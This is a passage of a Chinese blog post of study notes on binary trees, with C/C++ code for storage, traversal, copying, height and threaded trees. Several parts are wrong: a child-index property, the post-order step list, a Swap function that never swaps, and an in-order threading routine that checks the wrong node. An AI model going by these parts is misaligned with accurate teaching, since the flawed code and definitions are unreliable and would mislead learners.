class="line">InitTree(&amp;T)//初始化置空树</span><br><span class="line">CreateTree(&amp;T,definition)//按定义构造树</span><br><span class="line">Assign(T,cur_e,value)//为当前结点赋值</span><br><span class="line">InsertChild(&amp;T,&amp;p,i,c)//将c为根的树插入为结点p的第i棵子树</span><br></pre></td></tr></table></figure><p>删除类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClearTree(&amp;T)//清空树</span><br><span class="line">DestroyTree(&amp;T)//销毁树的结构</span><br><span class="line">DeleteChild(&amp;T,&amp;p,i)删除结点p的第i棵子树</span><br></pre></td></tr></table></figure><h3 id="二叉树的定义"><a href="#二叉树的定义" class="headerlink" title="二叉树的定义"></a>二叉树的定义</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>二叉树(Binary Tree)是n(n&gt;=0)个结点的集合，这个集合可以是空集，可以是一个结点，或者是由一个根结点和两棵称为左子树和右子树的互不相交的二叉树组成。</p><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><p>1.可以为空，即不含结点</p><p>2.每个结点至多有二棵子树(二叉树中不存在度大于2的结点)</p><p>3.二叉树是有序树，子树有左右之分，次序不能任意颠倒；允许有些结点只有左子树或右子树</p><h4 id="五种基本形态"><a href="#五种基本形态" class="headerlink" title="五种基本形态"></a>五种基本形态</h4><p>如图：<img src="/2023/11/14/树的五种基本形态.png" alt="image1"></p><h4 id="二叉树与树的区别"><a href="#二叉树与树的区别" class="headerlink" title="二叉树与树的区别"></a>二叉树与树的区别</h4><p>每个结点至多两个子树，且有左右之分</p><h3 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h3><p>1.在二叉树的第i(i&gt;=1)层上至多有$2^{i-1}$个结点</p><p>2.深度为k的二叉树最多有$2^k$-1个结点</p><p>3.对任意二叉树T，如果终端结点数为n~0~(度数为0的结点树),n~1~,n~2~分别表示度数为1，2的结点个数，则n~0~=n~2~+1</p><p>满二叉树：</p><p>一个二叉树的叶子结点都在最后一层上，且不存在度数为1的结点</p><p>设高为k则有$2^k$-1个结点</p><p>特点：</p><p>1.对给定的高度，满二叉树有最多结点</p><p>2.不存在度为1的结点</p><p>3.每个分支都有两颗高度相同的子树</p><p>4.叶子结点都在最后一层</p><p>(重点)<strong>完全二叉树</strong>：如果存在一颗二叉树，对树中结点自上而下，自左而右连续编号，若编号为i的结点的位置与满二叉树中i的结点的位置相同，则称此二叉树为完全二叉树。</p><p>特点：</p><p>1.叶子结点只可能在<strong>层树最大的两层</strong>上出现</p><p>2.对任意结点，若有右子树则必有左子树</p><p>3.具有n个结点的完全二叉树深度为$\lfloor log_2n\rfloor$+1（向下取整）或者$\lceil log_2(n+1)\rceil$(向上取整)</p><p>4.对于一个具有n个结点的完全二叉树，其结点按层序编号，则对任意结点k~i~(1$\leq$i$\leq$n)：</p><p>已知编号i(1$\leq$i$\leq$n)，双亲结点是$\lfloor i/2 \rfloor$</p><p>已知编号i(1$\leq$i$\leq$n/2)，左孩子结点为2i</p><p>已知编号i(1$\leq$i$\leq$(n-1)/2)，左孩子结点为2i+1</p><p>已知编号i(i为奇数,且1&lt;i&lt;n),左兄弟结点为i-1</p><p>已知编号i(i为偶数,且1&lt;i&lt;n),左兄弟结点为i+1</p><h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h4><p>利用完全二叉树的性质，可以将完全二叉树存入向量b[n]中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_TREE_SIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> TElemType SqBiTree[MAX_TREE_SIZE];</span><br><span class="line">SqBiTree bt;<span class="comment">//和TElemType bt[100]相同</span></span><br></pre></td></tr></table></figure><p><img src="/2023/11/14/顺序存储结构.png" alt="image2"></p><div class="table-container"><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th><th>12</th><th>13</th><th>14</th><th>15</th></tr></thead><tbody><tr><td>31</td><td>23</td><td>12</td><td>66</td><td>$\emptyset$</td><td>05</td><td>17</td><td>70</td><td>62</td><td>$\emptyset$</td><td>$\emptyset$</td><td>$\emptyset$</td><td>88</td><td>$\emptyset$</td><td>55</td></tr></tbody></table></div><p>顺序存储方式对于畸形二叉树，浪费空间</p><h4 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h4><p>每个结点中，设置两个链域指向左孩子和右孩子，一个数据域，若没有左孩子或右孩子，则指针指向NULL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><p>n个结点的二叉树中，共有n+1个空域</p><p>二叉链表很难找到双亲</p><p>三叉链表(带双亲的二叉链表) 含四个域：数据域，左指针域，右指针域，双亲域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TElemType</span>&#123;</span></span><br><span class="line">  <span class="type">int</span> key;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>&#123;</span></span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> *<span class="title">lch</span>,*<span class="title">rch</span>,*<span class="title">parent</span>;</span></span><br><span class="line">&#125;BiTNode,*BiTree;</span><br></pre></td></tr></table></figure><h4 id="二叉树的生成"><a href="#二叉树的生成" class="headerlink" title="二叉树的生成"></a>二叉树的生成</h4><p>递归创建</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BiTNode* <span class="title">CreateBiTree</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span> n, <span class="type">int</span> &amp;i,<span class="type">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;size&amp;&amp;a[i]!=n)</span><br><span class="line">    &#123;</span><br><span class="line">        BiTNode* newNode = <span class="built_in">InitBtNode</span>(a[i]);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;lch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        i++;</span><br><span class="line">        newNode-&gt;rch = <span class="built_in">CreateBiTree</span>(a, n, i,size);</span><br><span class="line">        <span class="keyword">return</span> newNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>销毁：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DestoryBiTree</span><span class="params">(BiTree &amp;root)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==root)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DestoryBiTree(root-&gt;lch);</span><br><span class="line">    DestoryBiTree(root-&gt;rch);</span><br><span class="line">    <span class="built_in">free</span>(root);</span><br><span class="line">    root = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h3><p>样例：<img src="/2023/11/14/遍历例子.png" alt="image3"></p><h4 id="前序遍历-先根遍历"><a href="#前序遍历-先根遍历" class="headerlink" title="前序遍历(先根遍历)"></a>前序遍历(先根遍历)</h4><p>1.若二叉树为空，则返回；</p><p>若不空：</p><p>2.访问根结点；</p><p>3.前序遍历左子树</p><p>4.前序遍历右子树</p><p><strong>先根，再左，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 2 4 8 9 5 10 11 3 6 12 7</span><br></pre></td></tr></table></figure><p>前序遍历的第一个结点的是根结点，最后一个结点一定是叶子结点。</p><h4 id="中序遍历-中根遍历"><a href="#中序遍历-中根遍历" class="headerlink" title="中序遍历(中根遍历)"></a>中序遍历(中根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.访问根结点；</p><p>4.中序遍历右子树。</p><p><strong>先左，再根，后右</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 4 9 2 10 5 11 1 12 6 3 7</span><br></pre></td></tr></table></figure><p>第一个结点是最左边的结点，最后一个结点是最右边的结点，根结点位于左子树结点和右子树结点之间。</p><h4 id="后序遍历-后根遍历"><a href="#后序遍历-后根遍历" class="headerlink" title="后序遍历(后根遍历)"></a>后序遍历(后根遍历)</h4><p>1.若二叉树空，返回；</p><p>若不空：</p><p>2.中序遍历左子树；</p><p>3.后序遍历右子树；</p><p>4.访问根结点。</p><p><strong>先左，再右，后根</strong></p><p>遍历结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8 9 4 10 11 5 2 12 6 7 3 1</span><br></pre></td></tr></table></figure><p>后序遍历中最后一个结点是根结点</p><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><h4 id="递归遍历"><a href="#递归遍历" class="headerlink" title="递归遍历"></a>递归遍历</h4><p>先序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    visit(T-&gt;data);<span class="comment">//遍历操作，可以是打印该结点的值</span></span><br><span class="line">    PreOrder(T-&gt;lch);</span><br><span class="line">    PreOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    InOrder(T-&gt;lch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">    InOrder(T-&gt;rch);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(T)&#123;</span><br><span class="line">    PostOrder(T-&gt;lch);</span><br><span class="line">    PostOrder(T-&gt;rch);</span><br><span class="line">    visit(T-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="非递归遍历"><a href="#非递归遍历" class="headerlink" title="非递归遍历"></a>非递归遍历</h4><p>先序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 100</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">(BiTNode *root)</span></span>&#123;</span><br><span class="line">  BiTNode *p,*BiNode[MAX];</span><br><span class="line">  <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">      <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">      BiNode[top]=p;</span><br><span class="line">      top++;</span><br><span class="line">      p=p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">      top--;</span><br><span class="line">      p=BiNode[top];</span><br><span class="line">      p=p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>中序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder_N</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    BiTNode *p,*BiNode[MAX];</span><br><span class="line">    <span class="type">int</span> top=<span class="number">0</span>;p=root;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isEmpty</span>(root))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;BiTree Empty!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            BiNode[top]=p;</span><br><span class="line">            top++;</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            top--;</span><br><span class="line">            p=BiNode[top];</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(top&gt;<span class="number">0</span>||p!=<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后序遍历：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrder_N</span><span class="params">(BiTree root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTNode *p, *lastVisited = <span class="literal">NULL</span>;</span><br><span class="line">    BiTNode *stack[MAX];</span><br><span class="line">    <span class="type">int</span> top = <span class="number">0</span>; <span class="comment">// 栈顶位置下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span> || top &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            stack[++top] = p;</span><br><span class="line">            p = p-&gt;lch;</span><br><span class="line">        &#125;</span><br><span class="line">        p = stack[top];</span><br><span class="line">        <span class="comment">// 判断右子树是否已经访问过</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rch == <span class="literal">NULL</span> || p-&gt;rch == lastVisited)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            lastVisited = p;</span><br><span class="line">            top--;</span><br><span class="line">            p = <span class="literal">NULL</span>; <span class="comment">// 置空，防止重复访问</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            p = p-&gt;rch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二叉树的其他操作"><a href="#二叉树的其他操作" class="headerlink" title="二叉树的其他操作"></a>二叉树的其他操作</h4><p>判断树是否空：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">isEmpty</span><span class="params">(BiTree root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问结点操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">visit</span><span class="params">(TElemType data)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,data.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">NodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">NodesNum</span>(b-&gt;lch)+<span class="built_in">NodesNum</span>(b-&gt;rch)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求叶子结点数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">LeafNodesNum</span><span class="params">(BiTNode *b)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> num1,num2;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b-&gt;lch==<span class="literal">NULL</span>&amp;&amp;b-&gt;rch==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        num1=<span class="built_in">LeafNodesNum</span>(b-&gt;lch);</span><br><span class="line">        num2=<span class="built_in">LeafNodesNum</span>(b-&gt;rch);</span><br><span class="line">        <span class="keyword">return</span> (num1+num2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制树的操作：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Copy</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Copy</span>(b-&gt;rch,t-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>交换左右子树：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Swap</span><span class="params">(BiTNode *b,BiTNode *&amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="literal">NULL</span>) t=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        t=(BiTNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        t-&gt;data=b-&gt;data;</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;lch, t-&gt;lch);</span><br><span class="line">        <span class="built_in">Swap</span>(b-&gt;rch,t-&gt;rch);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求树的高度：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">height</span><span class="params">(BiTree t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> tl,tr;</span><br><span class="line">    <span class="keyword">if</span>(t==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    tl=<span class="built_in">height</span>(t-&gt;lch);</span><br><span class="line">    tr=<span class="built_in">height</span>(t-&gt;rch);</span><br><span class="line">    <span class="keyword">if</span>(tl&gt;=tr) <span class="keyword">return</span> tl+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> tr+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p>给定遍历序列是否可以确定树的唯一结构？</p><p>只给出一个序列，无法确定树的唯一结构</p><p>给出前序和后序序列，无法确定唯一的二叉树</p><p>给出中序和后序序列，可以确定唯一的二叉树</p><p>给出中序和前序序列，可以确定唯一的二叉树</p><p>问题：给出前序和中序序列，如何构建二叉树？</p><p>代码实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateTree</span><span class="params">(BiTree &amp;T,<span class="type">int</span> root,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">char</span> *m,<span class="type">char</span> *n)</span>   <span class="comment">//创建二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    T=(BiNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiNode));</span><br><span class="line">    <span class="keyword">if</span>(start&gt;end)</span><br><span class="line">    &#123;</span><br><span class="line">        T=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=start;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;end&amp;&amp;n[i]!=m[root])</span><br><span class="line">        i++;</span><br><span class="line">    T-&gt;data=n[i];</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;lch,root+<span class="number">1</span>,start,i<span class="number">-1</span>,m,n);</span><br><span class="line">    <span class="built_in">CreateTree</span>(T-&gt;rch,root+<span class="number">1</span>+i-start,i+<span class="number">1</span> ,end,m,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>既可以指示前驱又可以指示后继的双链结构的二叉树称为线索二叉树</p><p>若结点有左子树，则lch指示左孩子，否则指示其前驱</p><p>若结点有右子树，则rch指示其右孩子，否则指示其后继</p><h4 id="结点结构"><a href="#结点结构" class="headerlink" title="结点结构"></a>结点结构</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lch</span>,*<span class="title">rch</span>;</span></span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br></pre></td></tr></table></figure><p>ltag=0 lch指向左孩子 ltag=1 lch指向前驱</p><p>ltag=0 rch指向右孩子 ltag=1 rch指向后继</p><h4 id="二叉树的线索化"><a href="#二叉树的线索化" class="headerlink" title="二叉树的线索化"></a>二叉树的线索化</h4><p>存储结构：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *lch,*rch;</span><br><span class="line">    <span class="type">int</span> ltag,rtag;</span><br><span class="line">&#125;threadbithptr,*BiThrTree;</span><br><span class="line">BiThrTree pre=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中序线索化：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">InThreading</span><span class="params">(BiThrTree p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;lch);</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;lch)&#123;</span><br><span class="line">            p-&gt;ltag=<span class="number">1</span>;</span><br><span class="line">            p-&gt;lch=pre;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;rch)&#123;</span><br><span class="line">            pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">            pre-&gt;rch=p;</span><br><span class="line">        &#125;</span><br><span class="line">        pre=p;</span><br><span class="line">        <span class="built_in">InThreading</span>(p-&gt;rch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderThreading</span><span class="params">(BiThrTree &amp;Thrt,BiThrTree T)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(Thrt=(threadbithptr*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(threadbithptr))))&#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Thrt-&gt;ltag=<span class="number">0</span>;</span><br><span class="line">    Thrt-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">    Thrt-&gt;rch=Thrt;</span><br><span class="line">    <span class="keyword">if</span>(!T)&#123;</span><br><span class="line">        Thrt-&gt;lch=Thrt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        Thrt-&gt;lch=T;</span><br><span class="line">        pre=Thrt;</span><br><span class="line">        <span class="built_in">InThreading</span>(T);</span><br><span class="line">        pre-&gt;rch=Thrt;</span><br><span class="line">        pre-&gt;rtag=<span class="number">1</span>;</span><br><span class="line">        Thrt-&gt;rch=pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的后继：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderNext</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;rtag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;rch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        q=p-&gt;rch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;lch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中序线索树中查找结点*p的前驱：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">threadbithptr* <span class="title">InOrderPre</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    threadbithptr *q;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;ltag==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> p-&gt;lch;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        q=p-&gt;lch;</span><br><span class="line">        <span class="keyword">while</span>(q-&gt;rtag==<span class="number">0</span>)</span><br><span class="line">            q=q-&gt;rch;</span><br><span class="line">        <span class="keyword">return</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历中序线索二叉树的非递归算法：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">TraverseInthread</span><span class="params">(threadbithptr *p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;ltag==<span class="number">0</span>)</span><br><span class="line">            p=p-&gt;lch;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="built_in">visit</span>(p-&gt;data);</span><br><span class="line">            p=<span class="built_in">InOrderNext</span>(p);</span><br><span class="line">        &#125;<span class="keyword">while</span>(p!=<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h3><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><h5 